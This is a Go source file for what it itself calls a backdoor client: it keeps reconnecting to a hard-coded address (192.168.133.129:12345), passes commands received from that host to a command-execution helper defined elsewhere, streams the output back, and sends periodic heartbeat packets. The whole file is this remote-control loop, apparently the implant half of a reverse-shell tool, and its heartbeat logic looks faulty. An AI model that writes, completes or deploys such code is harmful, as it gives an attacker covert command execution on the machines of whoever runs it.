package main

import (
	"fmt"
	"net"
	"time"
)

type backdoorClient struct {
}

var M *CmdIo

func (t *backdoorClient) OnSuccess(conn net.Conn) {
	M = NewCmdIo()
	time.Sleep(time.Second * 3)
}
func (t *backdoorClient) OnData(cmd, ext uint16, data []byte) error {
	// fmt.Println(data)
	process(cmd, ext, data)
	return nil
}

func process(cmd, ext uint16, data []byte) {
	if cmd == 1 && ext == 1 {
		M.Send(string(data))
	}
}
func (t *backdoorClient) OnRecvError(err error) {

}
func (t *backdoorClient) OnClose() {

}

func newClient(network, adress string) (*Client, error) {
	a := &backdoorClient{}
	client, err := Dial(network, adress, a)
	if err != nil {
		return nil, err
	}
	return client, nil
}

func main() {

START:
	client, err := newClient("tcp", "192.168.133.129:12345")
	if err != nil {
		time.Sleep(time.Second * 5)
		goto START
	}
	client.off = 0

	go func() {
		for {
			if client.off != 1 {
				time.Sleep(time.Second)
				if M.out.Len() != 0 {
					client.Send(3, 3, M.out.Bytes())
					M.out.Reset()
				}
			} else {
				break
			}

		}
	}()
	//心跳包
	go func() {
		for {
			if client.off != 1 {
				time.Sleep(time.Second * 5)
				n, err := client.Send(0, 0, []byte("hello"))
				if err != nil && n != 0 {
					fmt.Printf("err: %v\n", err)
					time.Sleep(time.Second * 5)
					break
				} else {
					break
				}
			}

		}
	}()
	<-client.T
	client.off = 1
	goto START

}
